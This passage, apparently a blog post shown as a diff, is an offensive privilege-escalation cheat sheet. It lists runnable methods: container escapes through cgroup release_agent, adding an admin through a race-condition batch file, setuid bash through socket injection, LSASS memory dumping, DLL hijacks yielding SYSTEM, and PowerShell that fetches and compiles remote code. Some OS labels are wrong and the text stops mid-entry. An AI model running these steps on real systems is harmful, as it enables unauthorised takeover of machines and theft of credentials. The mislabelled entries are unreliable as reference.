+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunting</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>git clone https://github.com/its-a-feature/KeytabParser</li>
+
+
+
+<li>python KeytabParser.py /etc/krb5.keytab</li>
+
+
+
+<li>klist -k /etc/krb5.keytab<br></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">Or</p>
+
+
+
+<ul class="wp-block-list">
+<li>klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab</li>
+
+
+
+<li>python3 keytabextract.py krb5.keytab</li>
+
+
+
+<li>./bifrost -action dump -source keytab -path test</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-ssh-forwarder"><strong>SSH Forwarder</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunting</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>ForwardAgent yes</li>
+
+
+
+<li>SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">AppleScript</p>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Enumeration &amp; Hunt</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>(EmPyre) &gt; listeners</li>
+
+
+
+<li>(EmPyre: listeners) &gt; set Name mylistener</li>
+
+
+
+<li>(EmPyre: listeners) &gt; execute</li>
+
+
+
+<li>(EmPyre: listeners) &gt; usestager applescript mylistener</li>
+
+
+
+<li>(EmPyre: stager/applescript) &gt; execute</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-dll-search-order-hijacking"><strong>DLL Search Order Hijacking</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Hijack</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie</li>
+
+
+
+<li>Brownie</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-slui-file-handler-hijack-lpe"><strong>Slui File Handler Hijack LPE</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Hijack</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation</li>
+
+
+
+<li>Slui.exe</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-cdpsvc-dll-hijacking"><strong>CDPSvc DLL Hijacking</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Hijack</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>Cdpsgshims.exe</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-magnify-exe-dll-search-order-hijacking"><strong>Magnify.exe Dll Search Order Hijacking</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Hijack</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>copy payload dll as igdgmm64.dll to SYSTEM path %PATH% which is writeable such as C:\python27</li>
+
+
+
+<li>Press WinKey+L</li>
+
+
+
+<li>Press Enter</li>
+
+
+
+<li>Press WinKey++(plusKey) on login screen which show password box.</li>
+
+
+
+<li>then payload dll will execute as SYSTEM access.</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-cdpsvc-service"><strong>CdpSvc Service </strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Hijack</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>Find Writable SYSTEM PATH with acltest.ps1 (such as C:\python27)</li>
+
+
+
+<li>C:\CdpSvcLPE&gt; powershell -ep bypass &#8220;. .\acltest.ps1&#8221;</li>
+
+
+
+<li>Copy cdpsgshims.dll to C:\python27</li>
+
+
+
+<li>make C:\temp folder and copy impersonate.bin to C:\temp</li>
+
+
+
+<li>C:\CdpSvcLPE&gt; mkdir C:\temp</li>
+
+
+
+<li>C:\CdpSvcLPE&gt; copy impersonate.bin C:\temp</li>
+
+
+
+<li>Reboot (or stop/start CDPSvc as an administrator)</li>
+
+
+
+<li>cmd wil prompt up with nt authority\system.</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-hivenightmare"><strong>HiveNightmare</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;0/1 Exploit</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>HiveNightmare.exe 200</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">CVE-2021-30655</p>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;0/1 Exploit</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>https://github.com/thehappydinoa/rootOS</li>
+
+
+
+<li>Python rootOS.py</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">CVE-2019-8526</p>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Mac</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;0/1 Exploit</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://github.com/amanszpapaya/MacPer">https://github.com/amanszpapaya/MacPer</a></li>
+
+
+
+<li>Python main.py</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">CVE-2020-9771</p>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Mac</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;0/1 Exploit</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://github.com/amanszpapaya/MacPer">https://github.com/amanszpapaya/MacPer</a></li>
+
+
+
+<li>Python main.py</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">CVE-2021-3156</p>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Mac</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;0/1 Exploit</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://github.com/amanszpapaya/MacPer">https://github.com/amanszpapaya/MacPer</a></li>
+
+
+
+<li>Python main.py</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">CVE-2018-4280</p>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Mac</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;0/1 Exploit</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>https://github.com/bazad/launchd-portrep</li>
+
+
+
+<li>./launchd-portrep &#8216;touch /tmp/exploit-success&#8217;=</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-abusing-with-filerestoreprivilege"><strong>Abusing with FileRestorePrivilege</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>poptoke.exe</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-abusing-with-restoreandbackupprivileges"><strong>Abusing with RestoreAndBackupPrivileges</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>poptoke.exe</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-abusing-with-shadowcopybackupprivilege"><strong>Abusing with ShadowCopyBackupPrivilege</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>poptoke.exe</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-abusing-with-shadowcopy"><strong>Abusing with ShadowCopy</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abuse Privilege</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>poptoke.exe</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-dynamic-phishing"><strong>Dynamic Phishing</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Mac</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Phish</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>https://github.com/thehappydinoa/rootOS</li>
+
+
+
+<li>Python rootOS.py</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-race-conditions"><strong>Race Conditions</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Race Condition</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>echo &#8220;net localgroup administrators attacker /add&#8221; &gt; C:\temp\not-evil.bat</li>
+
+
+
+<li>tempracer.exe C:\ temp\*.bat</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-abusing-usermode-helper-api"><strong>Abusing usermode helper API</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abusing Capabilities</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`</li>
+
+
+
+<li>mkdir -p $d/w; echo 1 &gt; $d/w/notify_on_release</li>
+
+
+
+<li>t=`sed -n &#8216;s/.*\perdir=\([^,]*\).*/\1/p&#8217; /etc/mtab`</li>
+
+
+
+<li>touch /o; echo $t/c &gt; $d/release_agent</li>
+
+
+
+<li>echo &#8220;#!/bin/sh&#8221; &gt; /c</li>
+
+
+
+<li>echo &#8220;ps &gt; $t/o&#8221; &gt;&gt; /c</li>
+
+
+
+<li>chmod +x /c</li>
+
+
+
+<li>sh -c &#8220;echo 0 &gt; $d/w/cgroup.procs&#8221;; sleep 1</li>
+
+
+
+<li>cat /o</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-escape-only-with-cap_sys_admin-capability"><strong>Escape only with CAP_SYS_ADMIN capability</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abusing Capabilities</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</li>
+
+
+
+<li>echo 1 &gt; /tmp/cgrp/x/notify_on_release</li>
+
+
+
+<li>host_path=`sed -n &#8216;s/.*\perdir=\([^,]*\).*/\1/p&#8217; /etc/mtab`</li>
+
+
+
+<li>echo &#8220;$host_path/cmd&#8221; &gt; /tmp/cgrp/release_agent</li>
+
+
+
+<li>echo &#8220;#!/bin/sh&#8221; &gt; /cmd</li>
+
+
+
+<li>echo &#8220;ps aux &gt; $host_path/output&#8221; &gt;&gt; /cmd</li>
+
+
+
+<li>chmod a+x /cmd</li>
+
+
+
+<li>sh -c &#8220;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#8221;</li>
+
+
+
+<li>cat /output</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-abusing-exposed-host-directories"><strong>Abusing exposed host directories</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abusing Capabilities</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>mknod /dev/sdb1 block 8 17</li>
+
+
+
+<li>mkdir /mnt/host_home</li>
+
+
+
+<li>mount /dev/sdb1 /mnt/host_home</li>
+
+
+
+<li>echo &#8216;echo &#8220;Hello from container land!&#8221; 2&gt;&amp;1&#8217; &gt;&gt; /mnt/host_home/eric_chiang_m/.bashrc</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-unix-wildcard"><strong>Unix Wildcard</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Injection</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>python wildpwn.py &#8211;file /tmp/very_secret_file combined ./pwn_me/</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-socket-command-injection"><strong>Socket Command Injection</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Injection</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>echo &#8220;cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;&#8221; | socat &#8211; UNIX-CLIENT:/tmp/socket_test.s</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-logstash"><strong>Logstash</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Injection</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>/etc/logstash/logstash.yml</li>
+
+
+
+<li>input {</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">exec {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command =&gt; &#8220;whoami&#8221;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;interval =&gt; 120</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>
+
+
+
+<h3 class="wp-block-heading" id="h-usodllloader"><strong>UsoDllLoader</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Injection</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>UsoDllLoader.exe</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-trend-chain-methods-for-privilege-escalation"><strong>Trend Chain Methods for Privilege Escalation </strong></h3>
+
+
+
+<h3 class="wp-block-heading" id="h-habanero-chilli"><strong>Habanero Chilli</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Dll Side-loading</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-padron-chilli"><strong>Padron Chilli</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Y/N</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Create a Reflective DLL Injector + Reflective DLL for dump lsass memory without touch hard disk</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>#.\inject.x64.exe &lt;Path to reflective dll: .\LsassDumpReflectiveDLL.dll&gt;</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-jalapeno-chillies"><strong>Jalapeno Chillies</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Methods: &nbsp;unhook NTDLL.dll + dump the lsass.exe as WindowsUpdateProvider.pod</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>NihilistGuy.exe</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-pasilla-chili"><strong>Pasilla Chili</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Methods: &nbsp;SeImpersonatePrivilege + Abusing Service Account Session</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://github.com/tyranid/blackhat-usa-2022-demos">https://github.com/tyranid/blackhat-usa-2022-demos</a></li>
+
+
+
+<li>Demo5.ps1</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-finger-chilli"><strong>Finger Chilli</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Abusing PrintNotify Service + DLL side-loading</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>As an administrator, copy winspool.drv and mod-ms-win-core-apiquery-l1-1-0.dll to C:\Windows\System32\spool\drivers\x64\3\</li>
+
+
+
+<li>Place all files which included in /bin/ into a same directory.</li>
+
+
+
+<li>Then, run powershell . .\spooltrigger.ps1.</li>
+
+
+
+<li>Enjoy a shell as NT AUTHORITY\SYSTEM.</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-orange-cayenne"><strong>Orange Cayenne</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Silver Ticket + I Know</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://github.com/tyranid/blackhat-usa-2022-demos">https://github.com/tyranid/blackhat-usa-2022-demos</a></li>
+
+
+
+<li>Demo1.ps1</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-red-cayenne"><strong>Red Cayenne</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Silver ticket + User to User Authentication</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://github.com/tyranid/blackhat-usa-2022-demos">https://github.com/tyranid/blackhat-usa-2022-demos</a></li>
+
+
+
+<li>demo2.ps1</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-birds-eye-chilli"><strong>Birds Eye Chilli</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Silver Ticket + Buffer Type Confusion</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://github.com/tyranid/blackhat-usa-2022-demos">https://github.com/tyranid/blackhat-usa-2022-demos</a></li>
+
+
+
+<li>Demo3.ps1</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-scotch-bonnet"><strong>Scotch Bonnet</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp; Bring Your Own KDC</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://github.com/tyranid/blackhat-usa-2022-demos">https://github.com/tyranid/blackhat-usa-2022-demos</a></li>
+
+
+
+<li>Demo4.ps1</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-lemon-habanero"><strong>Lemon Habanero</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Linux</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Capabilities</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>gcc -Wl,&#8211;no-as-needed -lcap-ng -o ambient ambient.c</li>
+
+
+
+<li>sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient</li>
+
+
+
+<li>./ambient /bin/bash</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-red-habanero"><strong>Red Habanero</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp; NtSetInformationProcess + DLL side-loading</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>BypassRtlSetProcessIsCritical.exe pid</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-ghost-pepper"><strong>Ghost Pepper</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp; <strong>allow low privileged user accounts to create file system and registry symbolic links</strong></p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>PS C:\&gt; $code = (iwr https://raw.githubusercontent.com/usdAG/SharpLink/main/SharpLink.cs).content</li>
+
+
+
+<li>PS C:\&gt; Add-Type $code&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li>
+
+
+
+<li>PS C:\&gt; $s = New-Object de.usd.SharpLink.Symlink(&#8220;C:\Users\Public\Example\link&#8221;, &#8220;C:\ProgramData\target.txt&#8221;)</li>
+
+
+
+<li>PS C:\&gt; $s.Open()</li>
+
+
+
+<li>PS C:\&gt; echo &#8220;Hello World :D&#8221; &gt; C:\Users\Public\Example\link</li>
+
+
+
+<li>PS C:\&gt; type C:\ProgramData\target.txt</li>
+
+
+
+<li>Hello World 😀</li>
+
+
+
+<li>PS C:\&gt; $s.Close()</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-chocolate-scorpion-chilli"><strong>Chocolate Scorpion Chilli</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
